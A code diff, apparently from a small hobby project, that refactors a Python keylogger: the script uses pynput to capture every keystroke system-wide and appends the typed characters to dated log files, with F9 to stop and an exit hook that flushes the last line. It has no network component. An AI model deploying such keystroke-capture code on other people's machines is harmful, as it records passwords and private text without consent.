@@ -1,6 +1,7 @@
 from time import sleep, time
 from pynput import keyboard, mouse
 from datetime import date
+import atexit
 import sys
 
 day = date.today()
@@ -12,40 +13,39 @@ stop = False
 logpath = "./logs/"+str(day)+".txt"
 
 
-writer = ""
-with open(logpath, "a") as writer:
+currentcharcount = 0
+currentline = ""
+
+def saveline():
+    global currentcharcount
+    global currentline
+
+    writer = open(logpath, "a")
+    writer.write(currentline+"\n")
+    writer.close()
     currentcharcount = 0
     currentline = ""
 
-    def onkeypress(keyevent):
-        global stop
-        try:
-            if keyevent == keyboard.Key.f9:
-                print("Close")
-                writer.close()
-                stop = True
-                listener.stop()
-                sys.exit()
+def onkeypress(keyevent):
+    try:
+        if keyevent == keyboard.Key.f9:
+            listener.stop()
 
-            global currentcharcount
-            global currentline
-            key = keyevent.char
-            if currentcharcount+len(key) > charsperline:
-                writer.write(currentline+"\n")
-                currentcharcount = 0
-                currentline = ""
+        global currentcharcount
+        global currentline
+        key = keyevent.char
+        if currentcharcount+len(key) > charsperline:
+            saveline()
+            
 
-            currentline += key
-            currentcharcount += len(key)
+        currentline += key
+        currentcharcount += len(key)
 
-        except:
-            _ = ""
+    except:
+        pass
 
+atexit.register(saveline)
 
-    listener = keyboard.Listener(on_press=onkeypress)
-    listener.start()
-
-    while True:
-        if stop:
-            break
-        sleep(1)
+listener = keyboard.Listener(on_press=onkeypress)
+listener.start()
+listener.join()
